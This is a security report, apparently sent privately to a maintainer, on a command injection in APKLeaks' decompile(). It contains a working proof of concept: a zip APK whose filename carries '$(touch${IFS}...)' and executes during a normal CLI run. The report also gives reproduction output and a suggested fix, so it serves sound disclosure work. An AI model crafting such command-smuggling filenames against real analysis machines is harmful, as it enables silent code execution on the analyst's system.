# Security Report (updated): command injection in APKLeaks.decompile() - CLI reproduction

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

- Date: 2026-09-09 (update; original private report same day)
- Affected component: `apkleaks/apkleaks.py`, `APKLeaks.decompile()`
- Class: CWE-78 OS Command Injection
- Reproduction level: **full CLI** (the `apkleaks` console script from `[project.scripts]`), per maintainer request

## Description

`decompile()` builds the jadx command line with `shlex.quote` and then destroys the protection:

```python
args = [self.jadx, self.file, "-d", self.tempdir]
args.extend(re.split(r"\s|=", self.disarg))
comm = "%s" % (" ".join(quote(arg) for arg in args))
comm = comm.replace("\'","\"")     # single quotes -> double quotes, blanket
os.system(comm)                    # POSIX sh: $(...) executes inside double quotes
```

The attacker-controlled channel is the APK **filename** (`-f`). Analyzing hostile samples is the tool's core use case, so an attacker-chosen drop name is a realistic input.

## Impact

Arbitrary command execution as the analyst, silently, during a normal successful CLI run (exit code 0 in the reproduction). Constraint found during testing: the payload filename cannot contain `/` (filesystem rule), so it uses `${IFS}` with a relative path; `integrity()` requires the payload file to be a genuine zip, which is trivially satisfiable by an attacker and noted for accuracy.

## PoC (CLI)

```bash
# jadx on PATH represents a jadx-equipped machine (stand-in only; the flaw is in apkleaks)
printf '#!/bin/sh\nexit 0\n' > bin/jadx && chmod +x bin/jadx

# attacker drop: valid zip APK with payload filename
python3 -c "import zipfile; zipfile.ZipFile('\$(touch\${IFS}apkleaks_pwned_CLI).apk','w').writestr('AndroidManifest.xml', b'placeholder')"

apkleaks -f '$(touch${IFS}apkleaks_pwned_CLI).apk'
```

## Execution result (full console-script run)

```
=== CLI invocation ===
$ apkleaks -f '<payload>.apk'
payload filename: $(touch${IFS}apkleaks_pwned_CLI).apk
exit code: 0
--- stdout (tail) ---
** Decompiling APK...
** Scanning against ''
** Done with nothing. ¯\_(ツ)_/¯
=== verdict ===
[evidence] $(touch...) executed during CLI decompile step: True
          (/…/poc/apkleaks_pwned_CLI created)
[RESULT] {"poc": "apkleaks-CMDQUOTE-command-injection-CLI", "verdict": "REPRODUCED",
          "executed": true, "exit_code": 0}
```

The side-effect file exists after the run: the command substitution executed during the decompile step while the CLI completed normally (exit 0). Chain walked by the console script: `cli.main -> APKLeaks(args) -> integrity() -> decompile() (injection) -> scanning() -> cleanup()`.

## Suggested fix

`subprocess.run(args_list, ...)` without a shell (first choice), or keep `shlex.quote` output unmodified if a shell string is required for legacy reasons.

## Disclosure status

Private thread with the maintainer per SECURITY.md; not otherwise disclosed.
